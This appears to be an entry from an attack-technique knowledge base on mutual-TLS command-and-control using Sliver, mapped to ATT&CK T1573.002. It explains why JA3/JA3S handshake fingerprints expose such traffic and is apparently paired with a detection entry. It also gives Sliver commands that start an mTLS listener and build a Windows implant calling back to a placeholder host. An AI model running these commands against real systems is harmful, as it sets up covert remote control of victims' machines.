---
id: mtls-c2-sliver
title: Mutual-TLS C2 session (Sliver mTLS implant)
section: Command & Control
phase: Command & Control
attack:
  tactic: TA0011
  techniques: [T1573.002]
platform: [windows, network]
source: MITRE ATT&CK T1573.002; Sliver / Mythic mTLS C2
pair: mtls-c2-ja3
---

A fully-interactive session channel wrapped in mutual TLS: the implant and the
server authenticate each other with per-implant certificates, so the traffic is
encrypted end to end and can't be MITM'd by an inspecting proxy without breaking the
pinned cert. Payload contents stay opaque — but the TLS *handshake* is a fingerprint.
The implant's crypto/extension ordering yields a stable JA3, and the server a stable
JA3S, which don't change across the sleep/jitter that hides the beacon cadence.

```sh
# Sliver: stand up an mTLS listener, then generate the matching session implant
sliver > mtls --lhost {{lhost}} --lport {{port}}
sliver > generate --mtls {{lhost}}:{{port}} --os windows --save implant.exe
```
